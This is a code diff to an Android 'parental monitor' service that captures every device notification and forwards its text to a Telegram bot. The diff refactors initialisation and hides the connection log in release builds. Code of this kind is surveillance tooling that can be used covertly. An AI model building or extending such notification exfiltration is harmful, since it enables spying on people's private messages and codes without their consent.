@@ -24,8 +24,23 @@ class NotificationForwarderService : NotificationListenerService() {
             return size > 200
         }
     }
-    private val prefsLazy by lazy { PreferencesManager.getInstance(this) }
-    private val queueLazy by lazy { MessageQueue(this) }
+    @Volatile
+    private var prefsRef: PreferencesManager? = null
+    @Volatile
+    private var queueRef: MessageQueue? = null
+
+    override fun onCreate() {
+        super.onCreate()
+        scope.launch {
+            try {
+                prefsRef = PreferencesManager.getInstance(this@NotificationForwarderService)
+                queueRef = MessageQueue(this@NotificationForwarderService)
+                prefsRef?.isConfigured()
+                queueRef?.hasMessages()
+            } catch (_: Exception) {
+            }
+        }
+    }
 
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
         val notification = sbn?.notification ?: return
@@ -38,8 +53,8 @@ class NotificationForwarderService : NotificationListenerService() {
     }
 
     private suspend fun handlePosted(pkg: String, notification: Notification) {
-        val prefs = try {
-            prefsLazy
+        val prefs = prefsRef ?: try {
+            PreferencesManager.getInstance(this).also { prefsRef = it }
         } catch (_: Exception) {
             return
         }
@@ -71,11 +86,13 @@ class NotificationForwarderService : NotificationListenerService() {
     }
 
     override fun onListenerConnected() {
-        android.util.Log.i("NotifForwarder", "Notification listener connected")
+        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("NotifForwarder", "Notification listener connected")
         scope.launch {
             try {
-                prefsLazy.isConfigured()
-                queueLazy.hasMessages()
+                val prefs = prefsRef ?: PreferencesManager.getInstance(this@NotificationForwarderService).also { prefsRef = it }
+                val queue = queueRef ?: MessageQueue(this@NotificationForwarderService).also { queueRef = it }
+                prefs.isConfigured()
+                queue.hasMessages()
             } catch (_: Exception) {
             }
         }
@@ -109,24 +126,24 @@ class NotificationForwarderService : NotificationListenerService() {
 
     private suspend fun forwardToTelegram(message: String) {
         try {
-            val prefs = prefsLazy
+            val prefs = prefsRef ?: return
             val botToken = prefs.botToken
             val chatId = prefs.chatId
             if (botToken.isEmpty() || chatId.isEmpty()) return
             if (!NetworkUtils.isNetworkAvailable(this)) {
-                queueLazy.addMessage(message)
+                (queueRef ?: MessageQueue(this).also { queueRef = it }).addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
                 return
             }
             val url = "https://api.telegram.org/bot$botToken/sendMessage"
             val response = TelegramClient.api.sendMessage(url, TelegramMessage(chatId = chatId, text = message))
             if (response.isSuccessful && response.body()?.ok == true) return
-            queueLazy.addMessage(message)
+            (queueRef ?: MessageQueue(this).also { queueRef = it }).addMessage(message)
             MessageScheduler.scheduleMessageSend(this)
         } catch (e: Exception) {
             android.util.Log.e("NotifForwarder", "Forward failed", e)
             try {
-                queueLazy.addMessage(message)
+                (queueRef ?: MessageQueue(this).also { queueRef = it }).addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
             } catch (_: Exception) {
             }
